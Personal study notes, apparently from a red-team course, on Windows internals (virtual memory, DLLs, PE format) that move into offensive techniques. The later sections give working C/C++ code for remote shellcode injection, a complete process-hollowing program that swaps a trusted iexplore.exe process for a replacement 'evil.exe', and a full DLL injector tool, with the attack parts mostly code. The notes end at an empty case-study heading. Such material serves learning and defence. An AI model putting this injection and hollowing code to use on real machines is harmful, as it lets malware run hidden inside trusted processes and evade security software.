### Virtual Address Space

Virtual memory is a critical component of how Windows internals work and interact with each other. Virtual memory allows other internal components to interact with memory as if it was physical memory without the risk of collisions between applications. The concept of modes and collisions is explained further in task 8.

Virtual memory provides each process with a [private virtual address space](https://docs.microsoft.com/en-us/windows/win32/memory/virtual-address-space). A memory manager is used to translate virtual addresses to physical addresses. By having a private virtual address space and not directly writing to physical memory, processes have less risk of causing damage.

The memory manager will also use _pages_ or _transfers_ to handle memory. Applications may use more virtual memory than physical memory allocated; the memory manager will transfer or page virtual memory to the disk to solve this problem. You can visualize this concept in the diagram below.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/49fb3abea645c7c5850ce3c83981fe76.png)  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/6346370db43e6cc74c2e7602d286e42c.png)

The theoretical maximum virtual address space is 4 GB on a 32-bit x86 system.

This address space is split in half, the lower half (_0x00000000 - 0x7FFFFFFF_) is allocated to processes as mentioned above. The upper half (_0x80000000 - 0xFFFFFFFF_) is allocated to OS memory utilization. Administrators can alter this allocation layout for applications that require a larger address space through settings (_increaseUserVA_) or the [AWE (**A**ddress **W**indowing **E**xtensions)](https://docs.microsoft.com/en-us/windows/win32/memory/address-windowing-extensions).

The theoretical maximum virtual address space is 256 TB on a 64-bit modern system.

The exact address layout ratio from the 32-bit system is allocated to the 64-bit system.

Most issues that require settings or AWE are resolved with the increased theoretical maximum.

You can visualize both of the address space allocation layouts to the right.

Although this concept does not directly translate to Windows internals or concepts, it is crucial to understand. If understood correctly, it can be leveraged to aid in abusing Windows internals

### DLL

The [Microsoft docs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#:~:text=A%20DLL%20is%20a%20library,common%20dialog%20box%20related%20functions.) describe a DLL as "a library that contains code and data that can be used by more than one program at the same time."

DLLs are used as one of the core functionalities behind application execution in Windows. From the [Windows documentation](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#:~:text=A%20DLL%20is%20a%20library,common%20dialog%20box%20related%20functions.), "The use of DLLs helps promote modularization of code, code reuse, efficient memory usage, and reduced disk space. So, the operating system and the programs load faster, run faster, and take less disk space on the computer."

When a DLL is loaded as a function in a program, the DLL is assigned as a dependency. Since a program is dependent on a DLL, attackers can target the DLLs rather than the applications to control some aspect of execution or functionality.

- DLL Hijacking ([T1574.001](https://attack.mitre.org/techniques/T1574/001/))
- DLL Side-Loading ([T1574.002](https://attack.mitre.org/techniques/T1574/002/))
- DLL Injection ([T1055.001](https://attack.mitre.org/techniques/T1055/001/))

DLLs are created no different than any other project/application; they only require slight syntax modification to work. Below is an example of a DLL from the _Visual C++ Win32 Dynamic-Link Library project_.

```cpp
#include "stdafx.h"
#define EXPORTING_DLL
#include "sampleDLL.h"
BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved
)
{
    return TRUE;
}

void HelloWorld()
{
    MessageBox( NULL, TEXT("Hello World"), TEXT("In a DLL"), MB_OK);
}
```

Below is the header file for the DLL; it will define what functions are imported and exported. We will discuss the header file's importance (or lack of) in the next section of this task.

```cpp
#ifndef INDLL_H
    #define INDLL_H
    #ifdef EXPORTING_DLL
        extern __declspec(dllexport) void HelloWorld();
    #else
        extern __declspec(dllimport) void HelloWorld();
    #endif

#endif
```

The DLL has been created, but that still leaves the question of how are they used in an application?

DLLs can be loaded in a program using _load-time dynamic linking_ or _run-time dynamic linking_.

When loaded using _load-time dynamic linking_, explicit calls to the DLL functions are made from the application. You can only achieve this type of linking by providing a header (_.h_) and import library (_.lib_) file. Below is an example of calling an exported DLL function from an application.

```cpp
#include "stdafx.h"
#include "sampleDLL.h"
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    HelloWorld();
    return 0;
}
```

When loaded using _run-time dynamic linking_, a separate function (`LoadLibrary` or `LoadLibraryEx`) is used to load the DLL at run time. Once loaded, you need to use `GetProcAddress` to identify the exported DLL function to call. Below is an example of loading and importing a DLL function in an application.

```cpp
...
typedef VOID (*DLLPROC) (LPTSTR);
...
HINSTANCE hinstDLL;
DLLPROC HelloWorld;
BOOL fFreeDLL;

hinstDLL = LoadLibrary("sampleDLL.dll");
if (hinstDLL != NULL)
{
    HelloWorld = (DLLPROC) GetProcAddress(hinstDLL, "HelloWorld");
    if (HelloWorld != NULL)
        (HelloWorld);
    fFreeDLL = FreeLibrary(hinstDLL);
}
...
```

In malicious code, threat actors will often use run-time dynamic linking more than load-time dynamic linking. This is because a malicious program may need to transfer files between memory regions, and transferring a single DLL is more manageable than importing using other file requirements.


### Portable Executable Format

Executables and applications are a large portion of how Windows internals operate at a higher level. The PE (**P**ortable **E**xecutable) format defines the information about the executable and stored data. The PE format also defines the structure of how data components are stored.

![[Pasted image 20240506225033.png]]

The PE (**P**ortable **E**xecutable) format is an overarching structure for executable and object files. The PE (**P**ortable **E**xecutable) and COFF (**C**ommon **O**bject **F**ile **F**ormat) files make up the PE format.

PE data is most commonly seen in the hex dump of an executable file. Below we will break down a hex dump of calc.exe into the sections of PE data.

The structure of PE data is broken up into seven components,

The **DOS Header** defines the type of file

The `MZ` DOS header defines the file format as `.exe`. The DOS header can be seen in the hex dump section below.

Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
00000000  4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..........ÿÿ..
00000010  B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ¸.......@.......
00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00000030  00 00 00 00 00 00 00 00 00 00 00 00 E8 00 00 00  ............è...
00000040  0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  ..º..´.Í!¸.LÍ!Th

The **DOS Stub** is a program run by default at the beginning of a file that prints a compatibility message. This does not affect any functionality of the file for most users.

The DOS stub prints the message `This program cannot be run in DOS mode`. The DOS stub can be seen in the hex dump section below.

00000040  0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  ..º..´.Í!¸.LÍ!Th
00000050  69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F  is program canno
00000060  74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20  t be run in DOS 
00000070  6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00  mode....$.......

The **PE File Header** provides PE header information of the binary. Defines the format of the file, contains the signature and image file header, and other information headers.

The PE file header is the section with the least human-readable output. You can identify the start of the PE file header from the `PE` stub in the hex dump section below.

000000E0  00 00 00 00 00 00 00 00 50 45 00 00 64 86 06 00  ........PE..d†..
000000F0  10 C4 40 03 00 00 00 00 00 00 00 00 F0 00 22 00  .Ä@.........ð.".
00000100  0B 02 0E 14 00 0C 00 00 00 62 00 00 00 00 00 00  .........b......
00000110  70 18 00 00 00 10 00 00 00 00 00 40 01 00 00 00  p..........@....
00000120  00 10 00 00 00 02 00 00 0A 00 00 00 0A 00 00 00  ................
00000130  0A 00 00 00 00 00 00 00 00 B0 00 00 00 04 00 00  .........°......
00000140  63 41 01 00 02 00 60 C1 00 00 08 00 00 00 00 00  cA....`Á........
00000150  00 20 00 00 00 00 00 00 00 00 10 00 00 00 00 00  . ..............
00000160  00 10 00 00 00 00 00 00 00 00 00 00 10 00 00 00  ................
00000170  00 00 00 00 00 00 00 00 94 27 00 00 A0 00 00 00  ........”'.. ...
00000180  00 50 00 00 10 47 00 00 00 40 00 00 F0 00 00 00  .P...G...@..ð...
00000190  00 00 00 00 00 00 00 00 00 A0 00 00 2C 00 00 00  ......... ..,...
000001A0  20 23 00 00 54 00 00 00 00 00 00 00 00 00 00 00   #..T...........
000001B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
000001C0  10 20 00 00 18 01 00 00 00 00 00 00 00 00 00 00  . ..............
000001D0  28 21 00 00 40 01 00 00 00 00 00 00 00 00 00 00  (!..@...........
000001E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

The **Image Optional Header** has a deceiving name and is an important part of the **PE File Header**

The **Data Dictionaries** are part of the image optional header. They point to the image data directory structure.

The **Section Table** will define the available sections and information in the image. As previously discussed, sections store the contents of the file, such as code, imports, and data. You can identify each section definition from the table in the hex dump section below.

000001F0  2E 74 65 78 74 00 00 00 D0 0B 00 00 00 10 00 00  .text...Ð.......
00000200  00 0C 00 00 00 04 00 00 00 00 00 00 00 00 00 00  ................
00000210  00 00 00 00 20 00 00 60 2E 72 64 61 74 61 00 00  .... ..`.rdata..
00000220  76 0C 00 00 00 20 00 00 00 0E 00 00 00 10 00 00  v.... ..........
00000230  00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40  ............@..@
00000240  2E 64 61 74 61 00 00 00 B8 06 00 00 00 30 00 00  .data...¸....0..
00000250  00 02 00 00 00 1E 00 00 00 00 00 00 00 00 00 00  ................
00000260  00 00 00 00 40 00 00 C0 2E 70 64 61 74 61 00 00  ....@..À.pdata..
00000270  F0 00 00 00 00 40 00 00 00 02 00 00 00 20 00 00  ð....@....... ..
00000280  00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40  ............@..@
00000290  2E 72 73 72 63 00 00 00 10 47 00 00 00 50 00 00  .rsrc....G...P..
000002A0  00 48 00 00 00 22 00 00 00 00 00 00 00 00 00 00  .H..."..........
000002B0  00 00 00 00 40 00 00 40 2E 72 65 6C 6F 63 00 00  ....@..@.reloc..
000002C0  2C 00 00 00 00 A0 00 00 00 02 00 00 00 6A 00 00  ,.... .......j..
000002D0  00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 42  ............@..B

Now that the headers have defined the format and function of the file, the sections can define the contents and data of the file.

|   |   |
|---|---|
|**Section  <br>**|**Purpose**|
|.text|Contains executable code and entry point|
|.data|Contains initialized data (strings, variables, etc.)|
|.rdata or .idata|Contains imports (Windows API) and DLLs.|
|.reloc|Contains relocation information|
|.rsrc|Contains application resources (images, etc.)|
|.debug|Contains debug information|

### Windows API Calls

1. At step one, we can use **OpenProcess** to obtain the handle of the specified process.

```C++
HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);
```

2. At step two, we can use VirtualAllocEx to allocate a region of memory with the payload buffer.
```C++
remoteBuffer = VirtualAllocEx(
	hProcess, // Opened target process
	NULL, 
	sizeof payload, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
```

3.  At step three, we can use WriteProcessMemory to write the payload to the allocated region of memory.
	```C++
WriteProcessMemory(
	hProcess, // Opened target process
	remoteBuffer, // Allocated memory region
	payload, // Data to write
	sizeof payload, // byte size of data
	NULL
);
```

4. At step four, we can use CreateRemoteThread to execute our payload from memory.
```C++
remoteThread = CreateRemoteThread(
	hProcess, // Opened target process
	NULL, 
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL, 
	0, // Ran immediately after creation
	NULL
); 
```


### Windows API

**Shellcode Injection**

1. Open a target process with all access rights.
```C#
processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);
```

2. Allocate target process memory for the shellcode.
```C#
remoteBuffer = VirtualAllocEx(
	processHandle, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);
```
3. Write shellcode to allocated memory in the target process.
```C#
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);
```
4. Execute the shellcode using a remote thread.
```C#
remoteThread = CreateRemoteThread(
	processHandle, // Opened target process
	NULL, 
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL, 
	0, // Ran immediately after creation
	NULL
);
```

![[Pasted image 20240511222905.png]]


### Process Hollowing

Process hollowing is a technique used in malware and software exploitation to hide malicious activity by injecting code into a legitimate process and replacing its original code with malicious instructions. Here's how it typically works:

1. **Selecting a Target Process**: The attacker identifies a legitimate process running on the system that they want to use as a disguise for their malicious activity. Typically, the chosen process is one that is trusted by the operating system and other security measures, such as an antivirus or firewall.
    
2. **Creating a Suspended Process**: The attacker creates a new instance of the chosen process in a suspended state. This means that the process is initialized but not yet allowed to execute any of its code.
    
3. **Replacing Code**: The attacker then replaces the legitimate code of the suspended process with their own malicious code. This could involve writing the malicious code into the memory space of the suspended process.
    
4. **Resuming Execution**: Once the malicious code has been injected into the process, the attacker resumes its execution. From the perspective of the operating system and other security measures, the process appears to be running as usual, with no indication of any malicious activity.
    
5. **Executing Malicious Code**: The malicious code injected into the legitimate process can perform various malicious actions, such as stealing sensitive information, downloading and executing additional malware, or tampering with system settings.
    
6. **Avoiding Detection**: By using a legitimate process as a disguise, the attacker can avoid detection by antivirus software and other security measures that may be monitoring for suspicious behavior. Since the process appears to be legitimate, it is less likely to raise any alarms

**Good tutorial**: https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations

**Destination / Host Image**

Let's start calc.exe as our host / destination process - this is going to be the process that we will be hollowing out and attempt to replace it with cmd.exe.
![[Pasted image 20240513004504.png]]

Now, in order to hollow out the destination process, we need to know its `ImageBaseAddress`. We can get the location of image base address from the [PEB](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block) structure of the host process via WinDBG - we know that the PEB is located at 0100e000:
![[Pasted image 20240513004649.png]]

..and we also know that the `ImageBaseAddress`is 8 bytes away from the PEB:
![[Pasted image 20240513004702.png]]

So, in the code we can get the offset location like so:
![[Pasted image 20240513004729.png]]

Finally, we can then get the `ImageBaseAddress` by reading that memory location:
![[Pasted image 20240513004738.png]]

**Source Image Size**

Let's get the `SizeOfImage` of the source image (cmd.exe) from its Optional Headers of the PE we just read - we need to know this value since we will need to allocate that much memory in the destination process (calc) in order to copy over the souce image (cmd):

![[Pasted image 20240513004945.png]]

**Destination Image Unmapping**

We can now carve / hollow out the destination image. Note how at the moment, before we perform the hollowing, the memory at address `01390000` (`ImageBaseAddress`) contains the calc.exe image:
![[Pasted image 20240513005114.png]]

Let's proceed with the hollowing:
![[Pasted image 20240513005217.png]]

After the memory has been allocated, we need to calculate the delta between the `ImageBaseAddress` of the destination image and the source image's preferred `ImageBase`- this is required for patching the binary.
![[Pasted image 20240513010220.png]]

### Full Source Code

```C#
#include <stdio.h>
#include <Windows.h>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);

int main() {

	LPSTARTUPINFOA pVictimStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pVictimProcessInfo = new PROCESS_INFORMATION();

	// Tested against 32-bit IE.
	LPCSTR victimImage = "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe";

	// Change this. Also must be 32-bit. Use project settings from the same project.
	LPCSTR replacementImage = "C:\\Users\\THM-Attacker\\Desktop\\Injectors\\evil.exe";

	// Create victim process
	if (!CreateProcessA(
			0,
			(LPSTR)victimImage,
			0,
			0,
			0,
			CREATE_SUSPENDED,
			0,
			0,
			pVictimStartupInfo,
			pVictimProcessInfo)) {
		printf("[-] Failed to create victim process %i\r\n", GetLastError());
		return 1;
	};

	printf("[+] Created victim process\r\n");
	printf("\t[*] PID %i\r\n", pVictimProcessInfo->dwProcessId);

	
	// Open replacement executable to place inside victim process
	HANDLE hReplacement = CreateFileA(
		replacementImage,
		GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		0,
		0
	);

	if (hReplacement == INVALID_HANDLE_VALUE) {
		printf("[-] Unable to open replacement executable %i\r\n", GetLastError());
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}

	DWORD replacementSize = GetFileSize(
		hReplacement,
		0);
	printf("[+] Replacement executable opened\r\n");
	printf("\t[*] Size %i bytes\r\n", replacementSize);

	
	// Allocate memory for replacement executable and then load it
	PVOID pReplacementImage = VirtualAlloc(
		0, 
		replacementSize, 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_READWRITE);

	DWORD totalNumberofBytesRead;

	if (!ReadFile(
			hReplacement, 
			pReplacementImage, 
			replacementSize, 
			&totalNumberofBytesRead, 
			0)) {
		printf("[-] Unable to read the replacement executable into an image in memory %i\r\n", GetLastError());
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}
	CloseHandle(hReplacement);
	printf("[+] Read replacement executable into memory\r\n");
	printf("\t[*] In current process at 0x%08x\r\n", (UINT)pReplacementImage);

	
	// Obtain context / register contents of victim process's primary thread
	CONTEXT victimContext;
	victimContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pVictimProcessInfo->hThread, 
		&victimContext);
	printf("[+] Obtained context from victim process's primary thread\r\n");
	printf("\t[*] Victim PEB address / EBX = 0x%08x\r\n", (UINT)victimContext.Ebx);
	printf("\t[*] Victim entry point / EAX = 0x%08x\r\n", (UINT)victimContext.Eax);

	
	// Get base address of the victim executable
	PVOID pVictimImageBaseAddress;
	ReadProcessMemory(
		pVictimProcessInfo->hProcess, 
		(PVOID)(victimContext.Ebx + 8), 
		&pVictimImageBaseAddress, 
		sizeof(PVOID), 
		0);
	printf("[+] Extracted image base address of victim process\r\n");
	printf("\t[*] Address: 0x%08x\r\n", (UINT)pVictimImageBaseAddress);

	
	// Unmap executable image from victim process	
	DWORD dwResult = NtUnmapViewOfSection(
		pVictimProcessInfo->hProcess,
		pVictimImageBaseAddress);
	if (dwResult) {
		printf("[-] Error unmapping section in victim process\r\n");
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}

	printf("[+] Hollowed out victim executable via NtUnmapViewOfSection\r\n");
	printf("\t[*] Utilized base address of 0x%08x\r\n", (UINT)pVictimImageBaseAddress);

	
	// Allocate memory for the replacement image in the remote process
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pReplacementImage;
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew);
	DWORD replacementImageBaseAddress = pNTHeaders->OptionalHeader.ImageBase;
	DWORD sizeOfReplacementImage = pNTHeaders->OptionalHeader.SizeOfImage;

	printf("[+] Replacement image metadata extracted\r\n");
	printf("\t[*] replacementImageBaseAddress = 0x%08x\r\n", (UINT)replacementImageBaseAddress);
	printf("\t[*] Replacement process entry point = 0x%08x\r\n", (UINT)pNTHeaders->OptionalHeader.AddressOfEntryPoint);
	
	PVOID pVictimHollowedAllocation = VirtualAllocEx(
		pVictimProcessInfo->hProcess,
		(PVOID)pVictimImageBaseAddress,
		sizeOfReplacementImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (!pVictimHollowedAllocation) {
		printf("[-] Unable to allocate memory in victim process %i\r\n", GetLastError());
		TerminateProcess(pVictimProcessInfo->hProcess, 1);
		return 1;
	}
	printf("[+] Allocated memory in victim process\r\n");
	printf("\t[*] pVictimHollowedAllocation = 0x%08x\r\n", (UINT)pVictimHollowedAllocation);
	
	
	// Write replacement process headers into victim process
	WriteProcessMemory(
		pVictimProcessInfo->hProcess, 
		(PVOID)pVictimImageBaseAddress,
		pReplacementImage,
		pNTHeaders->OptionalHeader.SizeOfHeaders,
		0);
	printf("\t[*] Headers written into victim process\r\n");
	
	// Write replacement process sections into victim process
	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pSectionHeader = 
			(PIMAGE_SECTION_HEADER)((LPBYTE)pReplacementImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) 
				+ (i * sizeof(IMAGE_SECTION_HEADER)));
		WriteProcessMemory(pVictimProcessInfo->hProcess, 
			(PVOID)((LPBYTE)pVictimHollowedAllocation + pSectionHeader->VirtualAddress),
			(PVOID)((LPBYTE)pReplacementImage + pSectionHeader->PointerToRawData),
			pSectionHeader->SizeOfRawData, 
			0);
		printf("\t[*] Section %s written into victim process at 0x%08x\r\n", pSectionHeader->Name, (UINT)pVictimHollowedAllocation + pSectionHeader->VirtualAddress);
		printf("\t\t[*] Replacement section header virtual address: 0x%08x\r\n", (UINT)pSectionHeader->VirtualAddress);
		printf("\t\t[*] Replacement section header pointer to raw data: 0x%08x\r\n", (UINT)pSectionHeader->PointerToRawData);
	}
	
	
	// Set victim process entry point to replacement image's entry point - change EAX
	victimContext.Eax = (SIZE_T)((LPBYTE)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
	SetThreadContext(
		pVictimProcessInfo->hThread, 
		&victimContext);
	printf("[+] Victim process entry point set to replacement image entry point in EAX register\n");
	printf("\t[*] Value is 0x%08x\r\n", (UINT)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);

	
	printf("[+] Resuming victim process primary thread...\n");
	ResumeThread(pVictimProcessInfo->hThread);

	printf("[+] Cleaning up\n");
	CloseHandle(pVictimProcessInfo->hThread);
	CloseHandle(pVictimProcessInfo->hProcess);
	VirtualFree(pReplacementImage, 0, MEM_RELEASE);

	return 0;
}
```


### DLL Injection

```C#
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot) {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &entry)) {
            do {
                if (!strcmp(entry.szExeFile, processName)) {
                    return entry.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &entry));
        }
    }
    else {
        return 0;
    }
}

int main(int argc, char *argv[]) {

    if (argc != 3) {
        printf("Cannot find require parameters\n");
        printf("Usage: dll-injector.exe <process name> <path to DLL>\n");
        exit(0);
    }

    char dllLibFullPath[256];

    LPCSTR processName = argv[1];
    LPCSTR dllLibName = argv[2];

    DWORD processId = getProcessId(processName);
    if (!processId) {
        exit(1);
    }

    if (!GetFullPathName(dllLibName, sizeof(dllLibFullPath), dllLibFullPath, NULL)) {
        exit(1);
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        exit(1);
    }

    LPVOID dllAllocatedMemory = VirtualAllocEx(hProcess, NULL, strlen(dllLibFullPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (dllAllocatedMemory == NULL) {
        exit(1);
    }

    if (!WriteProcessMemory(hProcess, dllAllocatedMemory, dllLibFullPath, strlen(dllLibFullPath) + 1, NULL)) {
        exit(1);
    }

    LPVOID loadLibrary = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

    HANDLE remoteThreadHandler = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) loadLibrary, dllAllocatedMemory, 0, NULL);
    if (remoteThreadHandler == NULL) {
        exit(1);
    }

    CloseHandle(hProcess);

    return 0;
}
```

### Case Study: Browser Injection + Hooking
